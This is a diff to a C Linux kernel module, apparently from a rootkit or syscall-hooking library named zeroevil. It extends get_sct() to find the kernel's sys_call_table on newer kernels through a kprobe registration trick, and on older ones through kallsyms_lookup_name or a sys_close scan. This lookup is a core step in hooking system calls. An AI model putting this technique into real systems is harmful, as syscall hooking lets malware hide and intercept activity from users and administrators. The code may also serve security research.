@@ -28,6 +28,9 @@
 // struct linux_dirent64.
 # include <linux/dirent.h>
 # include <linux/version.h>
+# if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
+# include <linux/kprobes.h>
+# endif
 # endif // CPP
 
 # include "zeroevil.h"
@@ -58,10 +61,43 @@ get_sct_via_sys_close(void)
 unsigned long **
 get_sct(void)
 {
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
-    return get_sct_via_sys_close();
+    unsigned long ** sct = NULL;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
+    if (!sct) {
+        struct kprobe kp = { 0 };
+        int fail = 0;
+
+        fm_info("Trying to get sct via kprobes....");
+        kp.symbol_name = "sys_call_table";
+        fail = register_kprobe(&kp);
+        fm_info("register_kprobe = %d", fail);
+        if (kp.addr) {
+            sct = (unsigned long**)kp.addr;
+        }
+        if (!fail) {
+            unregister_kprobe(&kp);
+        }
+    }
 #endif
-    return NULL;
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 7, 0)
+    if (!sct) {
+        fm_info("Trying to get sct via kallsyms_lookup_name....");
+        sct = (unsigned long **)kallsyms_lookup_name("sys_call_table");
+    }
+#endif
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 17, 0)
+    if (!sct) {
+        fm_info("Trying to get sct via sys_close....");
+        sct = get_sct_via_sys_close();
+    }
+#endif
+    if (!sct) {
+        fm_alert("BUG: Failed to get sct!!! Please report.");
+    }
+    return sct;
 }
 
 
